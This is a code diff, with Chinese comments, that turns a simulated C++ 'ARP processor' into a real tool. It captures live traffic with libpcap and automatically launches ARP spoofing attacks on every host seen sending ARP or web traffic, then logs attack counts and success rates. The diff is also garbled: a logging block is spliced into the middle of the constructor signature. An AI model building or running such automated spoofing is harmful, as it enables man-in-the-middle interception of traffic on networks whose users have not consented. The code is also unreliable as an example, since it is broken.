@@ -11,9 +11,25 @@
  * 高性能C++核心处理器，彻底解决Python GIL限制
  */
 
-ARPProcessor::ARPProcessor(const Config& config) 
+ARPProcessor::ARPProcessor(const Con            // 🔧 更详细的日志输出，显示真实网络状态
+            std::cout << "📈 [REAL NETWORK] Stats: Captured=" << stats.packets_captured 
+                     << ", Processed=" << stats.packets_processed
+                     << ", Attacks=" << stats.attacks_launched
+                     << ", Success=" << stats.attacks_successful
+                     << ", Rate=" << stats.processing_rate << " pps"
+                     << ", Hit Rate=" << stats.hit_rate << "%" << std::endl;
+            
+            // 🔧 网络状态检查
+            if (stats.packets_captured == 0) {
+                std::cout << "⚠️ [WARNING] No packets captured from real network interface: " 
+                         << config_.interface << " (Check interface and permissions)" << std::endl;
+            } else {
+                std::cout << "✅ [INFO] Real network capture is working on " << config_.interface << std::endl;
+            } 
     : config_(config)
-    , state_manager_(std::make_unique<StateManager>()) {
+    , state_manager_(std::make_unique<StateManager>()) 
+    , network_capture_(std::make_unique<RealNetworkCapture>())
+    , arp_attacker_(std::make_unique<RealARPAttacker>()) {
     statistics_.start_time = std::chrono::steady_clock::now();
 }
 
@@ -28,7 +44,7 @@ bool ARPProcessor::initialize() {
 
     try {
         // 初始化网络接口
-        std::cout << "Initializing ARP Processor..." << std::endl;
+        std::cout << "🚀 Initializing REAL ARP Processor..." << std::endl;
         std::cout << "Network interface: " << config_.interface << std::endl;
         std::cout << "Worker threads: " << config_.max_worker_threads << std::endl;
         std::cout << "Max concurrent attacks: " << config_.max_concurrent_attacks << std::endl;
@@ -38,9 +54,28 @@ bool ARPProcessor::initialize() {
             std::cerr << "Invalid worker thread count: " << config_.max_worker_threads << std::endl;
             return false;
         }
+        
+        // 🔧 初始化真实网络捕获器
+        std::cout << "📡 Initializing real network capture..." << std::endl;
+        if (!network_capture_->initialize(config_.interface, "arp or (tcp and (port 80 or port 443 or port 8080 or port 801))")) {
+            std::cerr << "❌ Failed to initialize network capture" << std::endl;
+            return false;
+        }
+        
+        // 🔧 初始化真实ARP攻击器
+        std::cout << "🎯 Initializing real ARP attacker..." << std::endl;
+        if (!arp_attacker_->initialize(config_.interface)) {
+            std::cerr << "❌ Failed to initialize ARP attacker" << std::endl;
+            return false;
+        }
+        
+        // 设置数据包回调
+        network_capture_->set_packet_callback([this](const RealNetworkCapture::PacketInfo& info) {
+            this->handle_captured_packet(info);
+        });
 
         initialized_.store(true);
-        std::cout << "ARP Processor initialized successfully" << std::endl;
+        std::cout << "✅ REAL ARP Processor initialized successfully" << std::endl;
         return true;
 
     } catch (const std::exception& e) {
@@ -117,40 +152,69 @@ bool ARPProcessor::is_running() const {
 }
 
 /**
- * 🔧 数据包捕获线程 - 高性能捕获
+ * 🔧 真实数据包捕获线程 - 使用libpcap
  */
 void ARPProcessor::packet_capture_thread() {
-    std::cout << "Packet capture thread started" << std::endl;
-    
-    // 模拟高性能数据包捕获
-    auto last_stats_time = std::chrono::steady_clock::now();
+    std::cout << "📡 [REAL] Packet capture thread started with libpcap" << std::endl;
     
     while (running_.load()) {
         try {
-            PacketData packet;
-            if (capture_packet(packet)) {
+            // 🔧 使用真实网络捕获器捕获数据包
+            if (network_capture_->capture_next_packet()) {
+                // 数据包通过回调函数处理，这里只需要统计
                 statistics_.packets_captured.fetch_add(1);
-                
-                // 将数据包放入处理队列 (无锁队列)
-                // 这里简化为直接处理，实际应使用无锁队列
-                AttackDecision decision;
-                if (analyze_packet(packet, decision)) {
-                    if (decision.should_attack) {
-                        execute_attack(decision);
-                    }
-                }
-                statistics_.packets_processed.fetch_add(1);
             }
             
-            // 控制捕获速率
+            // 控制捕获速率，避免CPU占用过高
             std::this_thread::sleep_for(std::chrono::microseconds(100));
             
         } catch (const std::exception& e) {
-            std::cerr << "Error in packet capture: " << e.what() << std::endl;
+            std::cerr << "❌ Error in real packet capture: " << e.what() << std::endl;
+            std::this_thread::sleep_for(std::chrono::seconds(1));
         }
     }
     
-    std::cout << "Packet capture thread stopped" << std::endl;
+    std::cout << "📡 [REAL] Packet capture thread stopped" << std::endl;
+}
+
+/**
+ * 🔧 真实数据包处理回调
+ */
+void ARPProcessor::handle_captured_packet(const RealNetworkCapture::PacketInfo& info) {
+    try {
+        // 🔧 详细的数据包信息日志
+        static int packet_count = 0;
+        packet_count++;
+        
+        if (packet_count % 100 == 0) {
+            std::cout << "📦 [REAL CAPTURE] Packet " << packet_count 
+                      << ": " << info.source_ip << ":" << info.source_port 
+                      << " -> " << info.dest_ip << ":" << info.dest_port 
+                      << " (" << info.protocol << ")" << std::endl;
+        }
+        
+        // 转换为内部数据包格式
+        PacketData packet;
+        packet.source_ip = info.source_ip;
+        packet.dest_ip = info.dest_ip;
+        packet.source_mac = info.source_mac;
+        packet.dest_mac = info.dest_mac;
+        packet.packet_type = info.protocol;
+        packet.timestamp = std::chrono::steady_clock::now();
+        
+        // 处理数据包
+        AttackDecision decision;
+        if (analyze_packet(packet, decision)) {
+            if (decision.should_attack) {
+                execute_attack(decision);
+            }
+        }
+        
+        statistics_.packets_processed.fetch_add(1);
+        
+    } catch (const std::exception& e) {
+        std::cerr << "❌ Error handling captured packet: " << e.what() << std::endl;
+    }
 }
 
 /**
@@ -196,7 +260,7 @@ void ARPProcessor::attack_executor_thread() {
  * 🔧 统计收集线程
  */
 void ARPProcessor::statistics_collector_thread() {
-    std::cout << "Statistics collector thread started" << std::endl;
+    std::cout << "📊 Statistics collector thread started" << std::endl;
     
     while (running_.load()) {
         try {
@@ -204,60 +268,60 @@ void ARPProcessor::statistics_collector_thread() {
             std::this_thread::sleep_for(std::chrono::seconds(5));
             
             auto stats = get_statistics();
-            std::cout << "📊 Stats: Captured=" << stats.packets_captured 
+            
+            // 🔧 更详细的日志输出，类似Python版本
+            std::cout << "� [INFO] Stats: Captured=" << stats.packets_captured 
                      << ", Processed=" << stats.packets_processed
                      << ", Attacks=" << stats.attacks_launched
-                     << ", Rate=" << stats.processing_rate << " pps" << std::endl;
+                     << ", Rate=" << stats.processing_rate << " pps"
+                     << ", Hit Rate=" << stats.hit_rate << "%" << std::endl;
+            
+            // 🔧 添加警告信息
+            if (stats.packets_captured == 0) {
+                std::cout << "⚠️ [WARNING] No packets captured - check network interface: " 
+                         << config_.interface << std::endl;
+            }
             
         } catch (const std::exception& e) {
-            std::cerr << "Error in statistics collector: " << e.what() << std::endl;
+            std::cerr << "❌ [ERROR] Error in statistics collector: " << e.what() << std::endl;
         }
     }
     
-    std::cout << "Statistics collector thread stopped" << std::endl;
-}
-
-/**
- * 🔧 模拟数据包捕获 (实际应该是真实的网络捕获)
- */
-bool ARPProcessor::capture_packet(PacketData& packet) {
-    // 模拟捕获到ARP包
-    static std::random_device rd;
-    static std::mt19937 gen(rd());
-    static std::uniform_int_distribution<> ip_dist(1, 254);
-    
-    packet.source_ip = "10.17.208." + std::to_string(ip_dist(gen));
-    packet.dest_ip = config_.gateway_ip;
-    packet.packet_type = "arp";
-    packet.timestamp = std::chrono::steady_clock::now();
-    
-    return true;
+    std::cout << "📊 Statistics collector thread stopped" << std::endl;
 }
 
 /**
  * 🔧 数据包分析 - 高性能分析
  */
 bool ARPProcessor::analyze_packet(const PacketData& packet, AttackDecision& decision) {
-    if (packet.packet_type != "arp") {
-        return false;
+    // 🔧 优先处理ARP包和目标端口的TCP包
+    if (packet.packet_type == "ARP" || packet.packet_type == "TCP") {
+        // 检查是否为目标端口（如果是TCP包）
+        bool is_target_traffic = packet.packet_type == "ARP";
+        
+        // 🔧 原子性攻击决策 - 解决重复攻击问题
+        auto result = state_manager_->atomic_try_start_attack(packet.source_ip);
+        
+        if (result.should_attack) {
+            decision.should_attack = true;
+            decision.target_ip = packet.source_ip;
+            decision.gateway_ip = config_.gateway_ip;
+            decision.target_mac = packet.source_mac;
+            decision.gateway_mac = ""; // 将通过ARP解析获得
+            decision.duration = config_.attack_timeout;
+            decision.session_id = result.session_id;
+            decision.reason = packet.packet_type == "ARP" ? "arp_traffic" : "target_port_traffic";
+            return true;
+        } else {
+            decision.should_attack = false;
+            decision.reason = result.reason;
+            return false;
+        }
     }
     
-    // 🔧 原子性攻击决策 - 解决重复攻击问题
-    auto result = state_manager_->atomic_try_start_attack(packet.source_ip);
-    
-    if (result.should_attack) {
-        decision.should_attack = true;
-        decision.target_ip = packet.source_ip;
-        decision.gateway_ip = config_.gateway_ip;
-        decision.duration = config_.attack_timeout;
-        decision.session_id = result.session_id;
-        decision.reason = "arp_gateway_query";
-        return true;
-    } else {
-        decision.should_attack = false;
-        decision.reason = result.reason;
-        return false;
-    }
+    decision.should_attack = false;
+    decision.reason = "non_target_traffic";
+    return false;
 }
 
 /**
@@ -268,16 +332,40 @@ bool ARPProcessor::execute_attack(const AttackDecision& decision) {
         return false;
     }
     
-    // 执行ARP欺骗攻击
-    std::cout << "🎯 Launching attack on " << decision.target_ip 
+    // 🔧 执行真实ARP欺骗攻击
+    std::cout << "🎯 [REAL ATTACK] Launching ARP spoofing on " << decision.target_ip 
               << " (Session: " << decision.session_id << ")" << std::endl;
     
     statistics_.attacks_launched.fetch_add(1);
     
-    // 模拟攻击执行时间
-    std::this_thread::sleep_for(std::chrono::milliseconds(1));
-    
-    return true;
+    try {
+        // 🔧 创建真实攻击目标
+        RealARPAttacker::AttackTarget target;
+        target.target_ip = decision.target_ip;
+        target.target_mac = decision.target_mac.empty() ? "00:11:22:33:44:55" : decision.target_mac; // 如果没有MAC，使用默认值
+        target.gateway_ip = decision.gateway_ip;
+        target.gateway_mac = decision.gateway_mac.empty() ? "aa:bb:cc:dd:ee:ff" : decision.gateway_mac;
+        target.interface = config_.interface;
+        target.session_id = decision.session_id;
+        target.start_time = std::chrono::duration<double>(std::chrono::steady_clock::now().time_since_epoch()).count();
+        target.active = true;
+        
+        // 🔧 执行真实攻击
+        bool success = arp_attacker_->execute_attack(target);
+        
+        if (success) {
+            statistics_.attacks_successful.fetch_add(1);
+            std::cout << "✅ [REAL ATTACK] ARP spoofing completed successfully on " << decision.target_ip << std::endl;
+        } else {
+            std::cerr << "❌ [REAL ATTACK] ARP spoofing failed on " << decision.target_ip << std::endl;
+        }
+        
+        return success;
+        
+    } catch (const std::exception& e) {
+        std::cerr << "❌ [REAL ATTACK] Exception during attack: " << e.what() << std::endl;
+        return false;
+    }
 }
 
 /**
